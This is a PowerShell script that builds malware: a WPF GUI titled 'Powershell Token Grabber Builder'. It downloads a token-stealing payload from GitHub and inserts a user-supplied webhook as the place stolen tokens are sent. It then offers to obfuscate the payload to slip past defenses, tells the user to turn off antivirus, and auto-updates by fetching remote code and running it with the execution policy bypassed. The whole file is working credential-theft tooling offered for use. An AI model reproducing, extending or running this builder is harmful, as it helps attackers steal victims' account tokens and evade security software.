Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$download_url = "https://raw.githubusercontent.com/Masterpcex/ServerMaintenance/main/main."

$wpf_code = @'
<Window x:Class="GUI_TEST.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        Title="Powershell Token Grabber | K.Dot#4044" Height="500" Width="850" WindowStyle="ThreeDBorderWindow" ResizeMode="NoResize">
    <Window.Resources>
        <ResourceDictionary>
            <Style x:Key="CustomButtonStyle" TargetType="{x:Type Button}">
                <Setter Property="Template">
                    <Setter.Value>
                        <ControlTemplate TargetType="{x:Type Button}">
                            <Border BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}">
                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                            </Border>
                            <ControlTemplate.Triggers>
                                <Trigger Property="IsMouseOver" Value="True">
                                </Trigger>
                            </ControlTemplate.Triggers>
                        </ControlTemplate>
                    </Setter.Value>
                </Setter>
            </Style>
        </ResourceDictionary>
    </Window.Resources>
    <Grid x:Name="Name_Thing" Background="#846DCF">
        <Grid.ColumnDefinitions>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition/>
        </Grid.ColumnDefinitions>
        <TextBox HorizontalAlignment="Center" Height="94" Margin="0,5,0,0" TextWrapping="Wrap" Text="Powershell Token Grabber Builder" VerticalAlignment="Top" Width="798" IsReadOnly="True" FontSize="18" BorderThickness="4,4,4,4" Background="Black" Foreground="White" IsHitTestVisible="False" Grid.Column="1">
            <TextBox.BorderBrush>
                <SolidColorBrush Color="#FF1AFB00" Opacity="1"/>
            </TextBox.BorderBrush>
        </TextBox>
        <TextBox x:Name="OUTPUT_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="203" Margin="10,152,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="410" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.ColumnSpan="2"/>
        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="152,119,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18" Grid.Column="1"/>
        <Button x:Name="Ps1_Button" Content="Build PS1" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,282,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1" Panel.ZIndex="1"/>
        <Button x:Name="Bat_Button" Content="Build BAT" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,335,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1" Panel.ZIndex="1"/>
        <Button x:Name="Exe_Button" Content="Build Exe" Style="{StaticResource CustomButtonStyle}" HorizontalAlignment="Left" Height="48" Margin="462,388,0,0" VerticalAlignment="Top" Width="346" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.Column="1" Panel.ZIndex="1"/>
        <TextBox x:Name="WEBHOOK_BOX" VerticalScrollBarVisibility="Auto" HorizontalAlignment="Left" Height="53" Margin="10,391,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="348" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4" Grid.ColumnSpan="2"/>
        <Label Content="ENTER WEBHOOK&#xD;&#xA;" HorizontalAlignment="Left" Height="28" Margin="121,358,0,0" VerticalAlignment="Top" Width="126" FontFamily="Impact" FontSize="18" Grid.ColumnSpan="2"/>
        <Button x:Name="CHECK_BUTTON" Grid.Column="1" Content="Check" HorizontalAlignment="Left" Height="53" Margin="363,391,0,0" VerticalAlignment="Top" Width="58" FontFamily="Impact" FontSize="18" Background="Black" Foreground="White"/>
        <Image Grid.Column="1" Height="NaN" Margin="478,70,26,149" Source="https://i.postimg.cc/m2SSKrBt/Logo.gif" Stretch="Fill" Width="NaN"/>
    </Grid>
</Window>
'@

function Invoke-SPEECH ($text) {
    $var_OUTPUT_BOX.Text += $text + "`n"
}

function Invoke-Obfuscation ($script_name) {
    python.exe  $PSScriptRoot\util\chameleon\chameleon.py -l 0 -o $script_name -v -s -d -n -c -f -r -i -x --decimal --safe $PSScriptRoot\$script_name
}

function Invoke-UI {
    if (Invoke-CheckUpdate) {
        $update_box = [System.Windows.MessageBox]::Show("There is an update available, do you want to update?", "Update?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
        if ($update_box -eq "Yes") {
            Invoke-AutoUpdate
        }
    }

    $inputXML = $wpf_code -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
    [XML]$XAML = $inputXML

    $reader = (New-Object System.Xml.XmlNodeReader $xaml)
    try {
        $window = [Windows.Markup.XamlReader]::Load( $reader )
    } catch {
        Write-Warning $_.Exception
        throw
    }

    $Window.add_Loaded({
        $Window.Icon = $icon_name_path
    })

    $xaml.SelectNodes("//*[@Name]") | ForEach-Object {
        Set-Variable -Name "var_$($_.Name)" -Value $window.FindName($_.Name) -ErrorAction SilentlyContinue
    }
    Get-Variable var_* > $null
    
    $var_Ps1_Button.add_Click({
        Write-Host "test"
        Invoke-PS1
    })
    
    $var_Bat_Button.add_Click({
        Invoke-BAT
    })

    $var_EXE_Button.add_Click({
        Invoke-EXE
    })
    
    $var_OUTPUT_BOX.add_TextChanged({
        $var_OUTPUT_BOX.ScrollToEnd()
    })

    $var_CHECK_BUTTON.add_Click({
        $webhook_box_text = $var_WEBHOOK_BOX.Text
        try {
            $output = Invoke-WebRequest -Uri $webhook_box_text -UseBasicParsing -TimeoutSec 5
        } catch {
            Invoke-SPEECH "Webhook is invalid"
            return
        }
        if ($output.StatusCode -eq 200) {
            Invoke-SPEECH "Webhook is valid"
        } else {
            Invoke-SPEECH "Webhook is invalid"
        }
    })

    Invoke-SPEECH "Successfully Started"
    Invoke-SPEECH "Note: You might have to turn your anti virus off for building."
    $Null = $window.ShowDialog()
}

function Hide-Console {
    [Win32.AllocConsole]::Invoke()
    $consoleWindowPtr = [Win32.GetConsoleWindow]::Invoke()
    [Win32.ShowWindow]::Invoke($consoleWindowPtr, 0)
}

function Invoke-PS1 {
    $webhook_url = $var_WEBHOOK_BOX.Text
    $download_url=$download_url+"ps1"
    Invoke-WebRequest -Uri $download_url -OutFile "main.ps1" -UseBasicParsing
    #replace YOUR_WEBHOOK_HERE from main.ps1 with the new url
    (Get-Content "main.ps1").Replace('YOUR_WEBHOOK_HERE', $webhook_url) | Set-Content "main.ps1"
    Invoke-SPEECH "Successfully Built PS1"

    $obfuscate_ps1 = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
    if ($obfuscate_ps1 -ne "Yes") {
        return
    }
    Invoke-Obfuscation "main.ps1"

}

function Invoke-BAT {
    $webhook_url = $var_WEBHOOK_BOX.Text
    $download_url=$download_url+"bat"
    Invoke-WebRequest -Uri $download_url -OutFile "main.bat" -UseBasicParsing
    (Get-Content "main.bat").Replace('YOUR_WEBHOOK_HERE2', $webhook_url) | Set-Content "main.bat"
    Invoke-SPEECH "Successfully Built BAT"
    $obfuscate_box = [System.Windows.MessageBox]::Show("Do you want to obfuscate the code?", "Obfuscate?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
    if ($obfuscate_box -ne "Yes") {
        return
    }
    Invoke-SPEECH "Obfuscating BAT"
    (New-Object System.Net.WebClient).DownloadFile('https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip', 'somalifuscator.zip')
    Remove-Item -Path .\somalifuscator -Recurse -Force -ErrorAction SilentlyContinue
    Expand-Archive -Path "somalifuscator.zip" -DestinationPath "somalifuscator"
    Remove-Item -Path "somalifuscator.zip"
    Invoke-SPEECH "Successfully Downloaded Somalifuscator"
    $current_dir = Get-Location
    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\SomalifuscatorV2-main"
    & $somalifuscator_dir\setup.bat $current_dir\main.bat
    Invoke-SPEECH "Successfully Obfuscated BAT"
    Remove-Item -Path $somalifuscator_dir -Recurse -Force -ErrorAction SilentlyContinue
}

function Invoke-EXE {
    [System.Windows.MessageBox]::Show("EXE MODE IS CURRENTLY UNAVAILABLE", "Ok?", [System.Windows.MessageBoxButton]::YesNo, [System.Windows.MessageBoxImage]::Question)
    Invoke-SPEECH "Pick a new option LMAO"
}

function Invoke-AutoUpdate {
    $update_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/builder.ps1"
    $update = (New-Object System.Net.WebClient).DownloadString($update_url)
    $update | Out-File -FilePath "$PSScriptRoot\builder.ps1" -Force -Encoding ascii -NoNewline
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSScriptRoot\builder.ps1"
    Stop-Process -Id $PID
    return $null
}

function Invoke-CheckUpdate {
    $update_url = "https://raw.githubusercontent.com/ChildrenOfYahweh/Powershell-Token-Grabber/main/builder.ps1"
    $update = (New-Object System.Net.WebClient).DownloadString($update_url)
    $current_code = Get-Content -Path "$PSScriptRoot\builder.ps1" -Raw
    if ($update -ne $current_code) {
        return $True
    }
    return $False
}

try {
    $current_dir = Get-Location
    $somalifuscator_dir = $current_dir.ToString() + "\somalifuscator\Somalifuscator-main"
    Remove-Item -Path $somalifuscator_dir -Recurse -Force -ErrorAction SilentlyContinue
    . "$PSScriptRoot\util\functions.ps1"
    . "$PSScriptRoot\util\psobfuscator.ps1"
} catch {
    $null
}

Invoke-UI
